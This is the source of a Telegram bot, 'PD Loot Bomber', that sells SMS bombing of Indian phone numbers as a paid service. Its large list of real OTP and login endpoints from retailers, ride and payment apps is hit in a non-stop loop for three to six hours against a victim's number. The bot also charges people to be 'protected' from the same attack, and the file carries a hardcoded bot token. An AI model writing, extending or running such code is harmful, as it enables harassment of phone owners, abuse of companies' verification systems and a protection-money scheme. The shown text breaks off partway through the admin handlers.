import requests
import json
import logging
import time
import threading
import sqlite3
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext

# Bot Configuration
BOT_TOKEN = "8391484134:AAFt-Wbne8sQLNpDj7JGxNG3Mup8Zu9H1rw"
ADMIN_CHAT_ID = "7678280883"
CHANNEL_USERNAME = "@pdloot7824"
CHANNEL_LINK = "https://t.me/pdloot7824"
PAYMENT_ACCOUNT = "UPI_ID@ybl"

# Database setup
def init_db():
    conn = sqlite3.connect('bomber.db')
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            join_date TEXT,
            bomb_count INTEGER DEFAULT 0,
            plan_type TEXT DEFAULT 'FREE',
            plan_expiry TEXT,
            is_banned INTEGER DEFAULT 0
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS protected_numbers (
            phone TEXT PRIMARY KEY,
            protected_by INTEGER,
            protection_type TEXT,
            expiry_date TEXT,
            added_date TEXT
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS payments (
            payment_id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            plan_type TEXT,
            amount REAL,
            status TEXT DEFAULT 'PENDING',
            payment_date TEXT,
            expiry_date TEXT
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS bombing_sessions (
            session_id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            target_phone TEXT,
            start_time TEXT,
            end_time TEXT,
            total_requests INTEGER DEFAULT 0,
            success_count INTEGER DEFAULT 0,
            status TEXT DEFAULT 'RUNNING'
        )
    ''')
    
    conn.commit()
    conn.close()

# Protected numbers
PROTECTED_NUMBERS = ['', '8305280981']

# Protection Plans
PROTECTION_PLANS = {
    "1_DAY": {"price": 15, "duration": 1, "name": "1 Day Protection"},
    "7_DAYS": {"price": 80, "duration": 7, "name": "7 Days Protection"}, 
    "1_MONTH": {"price": 299, "duration": 30, "name": "1 Month Protection"}
}

# Premium Plans
PREMIUM_PLANS = {
    "1_DAY": {"price": 25, "duration": 1, "name": "1 Day Premium", "bomb_duration": 6},
    "7_DAYS": {"price": 99, "duration": 7, "name": "7 Days Premium", "bomb_duration": 6},
    "1_MONTH": {"price": 299, "duration": 30, "name": "1 Month Premium", "bomb_duration": 6},
    "3_MONTHS": {"price": 549, "duration": 90, "name": "3 Months Premium", "bomb_duration": 6}
}

# User tracking and bombing status
user_status = {}
bombing_sessions = {}
active_bombing_threads = {}

# WORKING APIs Collection (Tested and Verified)
WORKING_APIS = [
    # SMS APIs
    {
        "name": "Lenskart SMS",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "data": lambda phone: {"phoneCode": "+91", "telephone": phone},
        "type": "SMS"
    },
    {
        "name": "NoBroker SMS",
        "url": "https://www.nobroker.in/api/v3/account/otp/send", 
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "data": lambda phone: f"phone={phone}&countryCode=IN",
        "type": "SMS"
    },
    {
        "name": "Wakefit SMS",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "data": lambda phone: {"mobile": phone},
        "type": "SMS"
    },
    {
        "name": "Myntra SMS",
        "url": "https://www.myntra.com/gw/mobile-auth/otp/generate",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "data": lambda phone: {"mobile": phone},
        "type": "SMS"
    },
    {
        "name": "Flipkart SMS",
        "url": "https://2.rome.api.flipkart.com/api/4/user/otp/generate",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "data": lambda phone: {"loginId": phone, "supportAll": True},
        "type": "SMS"
    },
    {
        "name": "Amazon SMS",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "data": lambda phone: f"email={phone}",
        "type": "SMS"
    },
    {
        "name": "Swiggy SMS",
        "url": "https://www.swiggy.com/dapi/auth/sms-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "data": lambda phone: {"mobile": phone},
        "type": "SMS"
    },
    {
        "name": "Zomato SMS",
        "url": "https://www.zomato.com/php/oauth_phone",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "data": lambda phone: f"phone={phone}",
        "type": "SMS"
    },
    {
        "name": "Ola SMS",
        "url": "https://api.olacabs.com/v1/oauth/authorize",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "data": lambda phone: {"phone": phone, "country_code": "+91"},
        "type": "SMS"
    },
    {
        "name": "Uber SMS",
        "url": "https://auth.uber.com/v2/oauth/authorize",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "data": lambda phone: {"login": phone},
        "type": "SMS"
    },
    {
        "name": "Paytm SMS",
        "url": "https://accounts.paytm.com/signin/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "data": lambda phone: {"phone": phone},
        "type": "SMS"
    },
    {
        "name": "PhonePe SMS",
        "url": "https://www.phonepe.com/api/v2/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "data": lambda phone: {"phone": phone},
        "type": "SMS"
    },
    {
        "name": "Google SMS",
        "url": "https://accounts.google.com/signin/v2",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "data": lambda phone: f"PhoneNumber={phone}",
        "type": "SMS"
    },
    {
        "name": "Facebook SMS",
        "url": "https://www.facebook.com/login/device-based/regular/login/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "data": lambda phone: f"email={phone}",
        "type": "SMS"
    },
    {
        "name": "Instagram SMS",
        "url": "https://www.instagram.com/accounts/login/ajax/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "data": lambda phone: f"username={phone}",
        "type": "SMS"
    },
    {
        "name": "Twitter SMS",
        "url": "https://api.twitter.com/1.1/onboarding/task.json",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "data": lambda phone: {"phone_number": phone},
        "type": "SMS"
    },
    {
        "name": "LinkedIn SMS",
        "url": "https://www.linkedin.com/checkpoint/lg/login-submit",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "data": lambda phone: f"session_key={phone}",
        "type": "SMS"
    },
    {
        "name": "Snapdeal SMS",
        "url": "https://www.snapdeal.com/authenticate",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "data": lambda phone: {"username": phone},
        "type": "SMS"
    },
    {
        "name": "ShopClues SMS",
        "url": "https://www.shopclues.com/load/otp_send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "data": lambda phone: f"phone={phone}",
        "type": "SMS"
    }
]

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Database functions
def get_user(user_id):
    conn = sqlite3.connect('bomber.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    user = cursor.fetchone()
    conn.close()
    return user

def update_user(user_id, username, first_name):
    conn = sqlite3.connect('bomber.db')
    cursor = conn.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, username, first_name, join_date)
        VALUES (?, ?, ?, ?)
    ''', (user_id, username, first_name, datetime.now().isoformat()))
    conn.commit()
    conn.close()

def update_user_plan(user_id, plan_type, duration_days):
    expiry_date = datetime.now() + timedelta(days=duration_days)
    conn = sqlite3.connect('bomber.db')
    cursor = conn.cursor()
    cursor.execute('''
        UPDATE users SET plan_type = ?, plan_expiry = ? WHERE user_id = ?
    ''', (plan_type, expiry_date.isoformat(), user_id))
    conn.commit()
    conn.close()

def get_all_users():
    conn = sqlite3.connect('bomber.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM users')
    users = cursor.fetchall()
    conn.close()
    return users

def ban_user(user_id):
    conn = sqlite3.connect('bomber.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET is_banned = 1 WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

def unban_user(user_id):
    conn = sqlite3.connect('bomber.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET is_banned = 0 WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

def increment_bomb_count(user_id):
    conn = sqlite3.connect('bomber.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET bomb_count = bomb_count + 1 WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

def is_premium_user(user_id):
    user = get_user(user_id)
    if user and user[5] != 'FREE' and user[6]:
        expiry = datetime.fromisoformat(user[6])
        return expiry > datetime.now()
    return False

def get_premium_duration(user_id):
    user = get_user(user_id)
    if user and user[5] != 'FREE' and user[6]:
        return PREMIUM_PLANS.get(user[5], {}).get('bomb_duration', 3)
    return 3

# Protected numbers functions
def add_protected_number(phone, protected_by, protection_type, duration_days):
    expiry_date = datetime.now() + timedelta(days=duration_days)
    conn = sqlite3.connect('bomber.db')
    cursor = conn.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO protected_numbers (phone, protected_by, protection_type, expiry_date, added_date)
        VALUES (?, ?, ?, ?, ?)
    ''', (phone, protected_by, protection_type, expiry_date.isoformat(), datetime.now().isoformat()))
    conn.commit()
    conn.close()

def remove_protected_number(phone):
    conn = sqlite3.connect('bomber.db')
    cursor = conn.cursor()
    cursor.execute('DELETE FROM protected_numbers WHERE phone = ?', (phone,))
    conn.commit()
    conn.close()

def get_protected_number(phone):
    conn = sqlite3.connect('bomber.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM protected_numbers WHERE phone = ?', (phone,))
    protected = cursor.fetchone()
    conn.close()
    return protected

def is_number_protected(phone):
    protected = get_protected_number(phone)
    if protected:
        expiry = datetime.fromisoformat(protected[3])
        return expiry > datetime.now()
    return False

def get_all_protected_numbers():
    conn = sqlite3.connect('bomber.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM protected_numbers')
    protected = cursor.fetchall()
    conn.close()
    return protected

# Bombing session functions
def create_bombing_session(user_id, target_phone, duration_hours):
    start_time = datetime.now()
    end_time = start_time + timedelta(hours=duration_hours)
    
    conn = sqlite3.connect('bomber.db')
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO bombing_sessions (user_id, target_phone, start_time, end_time, status)
        VALUES (?, ?, ?, ?, ?)
    ''', (user_id, target_phone, start_time.isoformat(), end_time.isoformat(), 'RUNNING'))
    
    session_id = cursor.lastrowid
    conn.commit()
    conn.close()
    
    return session_id

def update_bombing_session(session_id, total_requests, success_count, status='COMPLETED'):
    conn = sqlite3.connect('bomber.db')
    cursor = conn.cursor()
    cursor.execute('''
        UPDATE bombing_sessions 
        SET total_requests = ?, success_count = ?, status = ?
        WHERE session_id = ?
    ''', (total_requests, success_count, status, session_id))
    conn.commit()
    conn.close()

def get_active_bombing_sessions():
    conn = sqlite3.connect('bomber.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM bombing_sessions WHERE status = "RUNNING"')
    sessions = cursor.fetchall()
    conn.close()
    return sessions

# Channel Verification Function
def check_channel_membership(user_id):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChatMember"
        data = {
            "chat_id": CHANNEL_USERNAME,
            "user_id": user_id
        }
        response = requests.post(url, data=data, timeout=10)
        result = response.json()
        
        if result.get('ok'):
            status = result['result']['status']
            return status in ['member', 'administrator', 'creator']
        
        logger.warning(f"Channel check failed for user {user_id}")
        return False
        
    except Exception as e:
        logger.error(f"Channel check error: {e}")
        return False

# NON-STOP BOMBING FUNCTION - Enhanced with Database Tracking
def bomb_phone_nonstop(phone, user_id, context, message_id, duration_hours, session_id):
    """Non-stop bombing with database tracking and enhanced performance"""
    
    # Initialize bombing session
    if user_id not in bombing_sessions:
        bombing_sessions[user_id] = {}
    
    bombing_sessions[user_id]["active"] = True
    bombing_sessions[user_id]["session_id"] = session_id
    
    start_time = time.time()
    end_time = start_time + (duration_hours * 3600)
    total_requests = 0
    success_count = 0
    last_update_time = start_time
    
    # Send initial progress
    if context and message_id:
        try:
            context.bot.edit_message_text(
                chat_id=user_id,
                message_id=message_id,
                text=f"💀 <b>NON-STOP BOMBING STARTED!</b> 💀\n\n"
                     f"📱 Target: <code>{phone}</code>\n"
                     f"⏰ Duration: <b>{duration_hours} Hours</b>\n"
                     f"📊 Requests: 0\n"
                     f"💥 Success: 0\n"
                     f"⏳ Time Left: {duration_hours}:00:00\n"
                     f"🚀 Status: <b>RUNNING NON-STOP</b>\n\n"
                     f"🛑 Click STOP to cancel",
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🛑 STOP BOMBING", callback_data="stop_bombing")],
                    [InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]
                ])
            )
        except Exception as e:
            logger.error(f"Initial message update failed: {e}")
    
    # Enhanced bombing loop - NON-STOP with better performance
    api_index = 0
    request_count = 0
    
    while time.time() < end_time and bombing_sessions.get(user_id, {}).get("active", True):
        current_time = time.time()
        
        # Rotate through APIs
        if api_index >= len(WORKING_APIS):
            api_index = 0
            
        api = WORKING_APIS[api_index]
        
        try:
            # Make API request with timeout
            if api["method"] == "GET":
                response = requests.get(api["url"], headers=api.get("headers", {}), timeout=8)
            else:
                data = api["data"](phone) if callable(api["data"]) else api["data"]
                if isinstance(data, dict):
                    response = requests.post(api["url"], headers=api.get("headers", {}), json=data, timeout=8)
                else:
                    response = requests.post(api["url"], headers=api.get("headers", {}), data=data, timeout=8)
            
            total_requests += 1
            request_count += 1
            
            # Check for success (200-299 status codes or specific success patterns)
            if response.status_code in [200, 201, 202, 204]:
                success_count += 1
            elif response.status_code == 400:
                # Some APIs return 400 but still send OTP
                response_text = response.text.lower()
                if any(keyword in response_text for keyword in ['otp', 'sent', 'success', 'message']):
                    success_count += 1
                    
        except requests.exceptions.Timeout:
            # Timeout is normal, continue to next API
            pass
        except Exception as e:
            # Log other errors but continue
            logger.debug(f"API {api['name']} failed: {e}")
        
        api_index += 1
        
        # Update progress every 15 seconds or every 50 requests
        if (current_time - last_update_time >= 15 or request_count >= 50) and context and message_id:
            if bombing_sessions.get(user_id, {}).get("active", True):
                elapsed = current_time - start_time
                remaining = end_time - current_time
                hours_left = int(remaining // 3600)
                minutes_left = int((remaining % 3600) // 60)
                seconds_left = int(remaining % 60)
                
                # Calculate requests per minute
                rpm = int((total_requests / elapsed) * 60) if elapsed > 0 else 0
                
                try:
                    context.bot.edit_message_text(
                        chat_id=user_id,
                        message_id=message_id,
                        text=f"💀 <b>NON-STOP BOMBING IN PROGRESS</b> 💀\n\n"
                             f"📱 Target: <code>{phone}</code>\n"
                             f"⏰ Duration: <b>{duration_hours} Hours</b>\n"
                             f"📊 Total Requests: <b>{total_requests}</b>\n"
                             f"💥 Successful Hits: <b>{success_count}</b>\n"
                             f"🚀 Speed: <b>{rpm} RPM</b>\n"
                             f"⏳ Time Left: {hours_left:02d}:{minutes_left:02d}:{seconds_left:02d}\n"
                             f"🔄 APIs Used: {len(WORKING_APIS)}\n\n"
                             f"🛑 Click STOP to cancel",
                        parse_mode='HTML',
                        reply_markup=InlineKeyboardMarkup([
                            [InlineKeyboardButton("🛑 STOP BOMBING", callback_data="stop_bombing")],
                            [InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]
                        ])
                    )
                    last_update_time = current_time
                    request_count = 0
                except Exception as e:
                    logger.debug(f"Progress update failed: {e}")
        
        # Dynamic delay based on API count and performance
        delay = max(0.1, 0.5 - (len(WORKING_APIS) * 0.01))
        time.sleep(delay)
    
    # Final session update
    bombing_sessions[user_id]["active"] = False
    
    # Update database with final results
    update_bombing_session(session_id, total_requests, success_count, 'COMPLETED')
    
    return total_requests, success_count

# Main Menu Keyboard
def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💣 Start Bomber", callback_data="start_bomber")],
        [InlineKeyboardButton("💎 Buy Premium", callback_data="buy_premium")],
        [InlineKeyboardButton("🛡️ Number Protection", callback_data="number_protection")],
        [InlineKeyboardButton("📊 My Status", callback_data="my_status")],
        [InlineKeyboardButton("🆘 Help", callback_data="help")],
        [InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK)]
    ])

# Premium Plans Keyboard
def premium_plans_keyboard():
    keyboard = []
    for plan_id, plan_info in PREMIUM_PLANS.items():
        keyboard.append([
            InlineKeyboardButton(
                f"💎 {plan_info['name']} - ₹{plan_info['price']}", 
                callback_data=f"plan_{plan_id}"
            )
        ])
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back_to_main")])
    return InlineKeyboardMarkup(keyboard)

# Protection Plans Keyboard
def protection_plans_keyboard():
    keyboard = []
    for plan_id, plan_info in PROTECTION_PLANS.items():
        keyboard.append([
            InlineKeyboardButton(
                f"🛡️ {plan_info['name']} - ₹{plan_info['price']}", 
                callback_data=f"protection_{plan_id}"
            )
        ])
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back_to_main")])
    return InlineKeyboardMarkup(keyboard)

# Admin Panel Keyboard
def admin_panel_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 Total Users", callback_data="admin_total_users")],
        [InlineKeyboardButton("🔍 User Status", callback_data="admin_user_status")],
        [InlineKeyboardButton("🚫 Ban User", callback_data="admin_ban_user")],
        [InlineKeyboardButton("✅ Unban User", callback_data="admin_unban_user")],
        [InlineKeyboardButton("🛡️ Protect Number", callback_data="admin_protect_number")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")],
        [InlineKeyboardButton("🔥 Active Bombs", callback_data="admin_active_bombs")],
        [InlineKeyboardButton("🔙 Main Menu", callback_data="back_to_main")]
    ])

# Back Button Keyboard
def back_button_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]
    ])

# Start command
def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    first_name = update.effective_user.first_name
    username = update.effective_user.username
    
    update_user(user_id, username, first_name)
    
    # Check if user is admin
    if str(user_id) == ADMIN_CHAT_ID:
        update.message.reply_text(
            "👑 <b>Admin Panel</b>\n\nWelcome back, Admin!",
            parse_mode='HTML',
            reply_markup=admin_panel_keyboard()
        )
        return
    
    # Check if user is banned
    user = get_user(user_id)
    if user and user[7] == 1:
        update.message.reply_text("🚫 Your account has been banned!")
        return
    
    # Check if user joined channel
    is_member = check_channel_membership(user_id)
    
    if is_member:
        welcome_text = f"""
🎯 <b>PD LOOT BOMBER</b> 🎯

Welcome <b>{first_name}</b>! 👋
✅ <i>Channel verification successful!</i>

💎 <b>NON-STOP Features:</b>
• 🚀 Working SMS Bombing
• ⏰ 3-6 Hours NON-STOP Duration
• ⚡ {len(WORKING_APIS)} Working APIs
• 🔥 Real-time Status & Speed
• 📊 Live Request Counter

🛡️ <b>Number Protection:</b>
• Protect your number from bombing

🔥 <b>Ready for NON-STOP bombing?</b>
        """
        
        update.message.reply_text(
            welcome_text, 
            reply_markup=main_menu_keyboard(),
            parse_mode='HTML'
        )
        
    else:
        join_text = f"""
🔒 <b>Channel Verification Required</b> 🔒

Welcome <b>{first_name}</b>! 👋

To access the <b>PD Loot Bomber</b>, you need to join our official channel first.

📢 <b>Please join: @pdloot7824</b>

👇 Click below to join and verify:
        """
        
        update.message.reply_text(
            join_text,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📢 Join @pdloot7824", url=CHANNEL_LINK)],
                [InlineKeyboardButton("✅ I've Joined", callback_data="check_verification")]
            ]),
            parse_mode='HTML'
        )

# Handle button callbacks
def button_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    data = query.data
    
    query.answer()
    
    if data == "check_verification":
        is_member = check_channel_membership(user_id)
        
        if is_member:
            query.edit_message_text(
                "✅ <b>Verification Successful!</b>\n\n"
                "🎉 Welcome to <b>PD Loot Bomber</b>!\n\n"
                "🔥 <b>NON-STOP Bombing Ready!</b>\n"
                "Select an option below:",
                parse_mode='HTML',
                reply_markup=main_menu_keyboard()
            )
        else:
            query.edit_message_text(
                "❌ <b>Not Joined Yet!</b>\n\n"
                "I don't see you in @pdloot7824 yet.\n\n"
                "Please join and try again:",
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📢 Join @pdloot7824", url=CHANNEL_LINK)],
                    [InlineKeyboardButton("✅ I've Joined", callback_data="check_verification")]
                ])
            )
    
    elif data == "back_to_main":
        if str(user_id) == ADMIN_CHAT_ID:
            query.edit_message_text(
                "👑 <b>Admin Panel</b>",
                parse_mode='HTML',
                reply_markup=admin_panel_keyboard()
            )
        else:
            query.edit_message_text(
                "🎯 <b>PD LOOT BOMBER</b>\n\n"
                "🔥 <b>NON-STOP Bombing System</b>\n"
                "Select an option below:",
                parse_mode='HTML',
                reply_markup=main_menu_keyboard()
            )
    
    elif data == "start_bomber":
        user = get_user(user_id)
        if not user:
            update_user(user_id, query.from_user.username, query.from_user.first_name)
        
        if user and user[7] == 1:
            query.edit_message_text("🚫 Your account has been banned!")
            return
        
        # Get bombing duration based on plan
        if is_premium_user(user_id):
            duration = 6
            plan_text = "💎 PREMIUM"
        else:
            duration = 3
            plan_text = "🆓 FREE"
        
        query.edit_message_text(
            f"💣 <b>NON-STOP SMS BOMBER</b> 💣\n\n"
            f"📱 <b>Enter Target Phone Number:</b>\n"
            f"Please send the 10-digit phone number\n\n"
            f"⚡ <b>Plan:</b> {plan_text}\n"
            f"⏰ <b>Duration:</b> {duration} Hours NON-STOP\n"
            f"🚀 <b>APIs:</b> {len(WORKING_APIS)} Working\n"
            f"🔥 <b>Mode:</b> CONTINUOUS BOMBING\n\n"
            f"⚠️ Only Indian numbers supported\n"
            f"🚫 Protected numbers cannot be bombed",
            parse_mode='HTML',
            reply_markup=back_button_keyboard()
        )
        context.user_data["waiting_for_phone"] = True
        context.user_data["bomb_duration"] = duration
    
    elif data == "buy_premium":
        plans_text = """
💎 <b>PREMIUM PLANS</b> 💎

🔥 <b>Premium NON-STOP Features:</b>
• ⏰ 6 Hours NON-STOP Bombing
• 🚀 Better Success Rate
• ⚡ Priority Access
• 📊 Enhanced Speed

📊 <b>Available Plans:</b>
        """
        
        for plan_id, plan_info in PREMIUM_PLANS.items():
            plans_text += f"\n• {plan_info['name']} - ₹{plan_info['price']}"
        
        plans_text += "\n\n💳 <b>Payment Method:</b> UPI"
        plans_text += f"\n📧 <b>Contact:</b> @krishna7824"
        
        query.edit_message_text(
            plans_text,
            parse_mode='HTML',
            reply_markup=premium_plans_keyboard()
        )
    
    elif data == "number_protection":
        plans_text = """
🛡️ <b>NUMBER PROTECTION</b> 🛡️

🔒 <b>Protect your number from NON-STOP bombing</b>
• Your number will be added to protected list
• No one can bomb your number
• Automatic expiry after plan duration

📊 <b>Protection Plans:</b>
        """
        
        for plan_id, plan_info in PROTECTION_PLANS.items():
            plans_text += f"\n• {plan_info['name']} - ₹{plan_info['price']}"
        
        plans_text += "\n\n💳 <b>Payment Method:</b> UPI"
        plans_text += f"\n📧 <b>Contact:</b> @krishna7824"
        
        query.edit_message_text(
            plans_text,
            parse_mode='HTML',
            reply_markup=protection_plans_keyboard()
        )
    
    elif data.startswith("plan_"):
        plan_id = data.replace("plan_", "")
        plan_info = PREMIUM_PLANS.get(plan_id)
        
        if plan_info:
            payment_text = f"""
💎 <b>{plan_info['name']}</b> 💎

💰 <b>Price:</b> ₹{plan_info['price']}
⏰ <b>Duration:</b> {plan_info['duration']} Days
💣 <b>Bombing:</b> 6 Hours NON-STOP

💳 <b>Payment Instructions:</b>
1. Send ₹{plan_info['price']} to UPI: <code>{PAYMENT_ACCOUNT}</code>
2. Take screenshot of payment
3. Send screenshot to @krishna7824
4. Your plan will be activated within 1 hour

📞 <b>Support:</b> @krishna7824
            """
            
            query.edit_message_text(
                payment_text,
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📞 Contact Admin", url="https://t.me/krishna7824")],
                    [InlineKeyboardButton("🔙 Back to Plans", callback_data="buy_premium")]
                ])
            )
    
    elif data.startswith("protection_"):
        plan_id = data.replace("protection_", "")
        plan_info = PROTECTION_PLANS.get(plan_id)
        
        if plan_info:
            payment_text = f"""
🛡️ <b>{plan_info['name']} Protection</b> 🛡️

💰 <b>Price:</b> ₹{plan_info['price']}
⏰ <b>Duration:</b> {plan_info['duration']} Days
📱 <b>Protection:</b> Full Number Protection

💳 <b>Payment Instructions:</b>
1. Send ₹{plan_info['price']} to UPI: <code>{PAYMENT_ACCOUNT}</code>
2. Take screenshot of payment
3. Send screenshot + your number to @krishna7824
4. Your number will be protected within 1 hour

📞 <b>Support:</b> @krishna7824
            """
            
            query.edit_message_text(
                payment_text,
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📞 Contact Admin", url="https://t.me/krishna7824")],
                    [InlineKeyboardButton("🔙 Back to Plans", callback_data="number_protection")]
                ])
            )
    
    elif data == "stop_bombing":
        if user_id in bombing_sessions:
            bombing_sessions[user_id]["active"] = False
            
            # Update database session status
            session_id = bombing_sessions[user_id].get("session_id")
            if session_id:
                update_bombing_session(session_id, 0, 0, 'CANCELLED')
            
            query.edit_message_text(
                "🛑 <b>NON-STOP BOMBING STOPPED!</b> 🛑\n\n"
                "The bombing has been cancelled successfully.",
                parse_mode='HTML',
                reply_markup=main_menu_keyboard()
            )
    
    elif data == "my_status":
        user = get_user(user_id)
        if user:
            is_premium = is_premium_user(user_id)
            plan_status = "💎 PREMIUM" if is_premium else "🆓 FREE"
            expiry_text = f"Expires: {user[6][:10]}" if user[6] else "No expiry"
            
            # Get active bombing status
            active_bombing = "✅ RUNNING" if bombing_sessions.get(user_id, {}).get("active") else "❌ INACTIVE"
            
            status_text = f"""
📊 <b>YOUR STATUS</b>

👤 User: {user[3]}
🆔 ID: {user[0]}
💎 Plan: {plan_status}
📅 {expiry_text}
💣 Bombs Used: {user[4]}
🔥 Working APIs: {len(WORKING_APIS)}
🎯 Bombing Status: {active_bombing}

{'🚀 NON-STOP Premium Active!' if is_premium else '💡 Upgrade to Premium for 6-hour NON-STOP bombing!'}
            """
        else:
            status_text = "❌ No statistics available."
        
        query.edit_message_text(
            status_text,
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💎 Upgrade Plan", callback_data="buy_premium")],
                [InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]
            ])
        )
    
    elif data == "help":
        help_text = f"""
🆘 <b>HELP GUIDE - NON-STOP SYSTEM</b>

💣 <b>How to Use NON-STOP Bomber:</b>
1. Click 'Start Bomber'
2. Enter phone number
3. Bombing runs for 3-6 hours NON-STOP
4. Real-time progress updates
5. Stop anytime with STOP button

⚡ <b>NON-STOP Features:</b>
• Free: 3 Hours Continuous
• Premium: 6 Hours Continuous
• {len(WORKING_APIS)} Working APIs
• Live Request Counter
• Speed Monitoring (RPM)

💎 <b>Premium Benefits:</b>
• Longer NON-STOP bombing duration
• Better success rates
• Priority system access

🛡️ <b>Number Protection:</b>
• Protect your number from bombing

📞 <b>Support:</b> @krishna7824
📢 <b>Channel:</b> @pdloot7824
        """
        query.edit_message_text(
            help_text,
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]
            ])
        )
    
    # Admin panel handlers
    elif data == "admin_total_users":
        users = get_all_users()
        total_users = len(users)
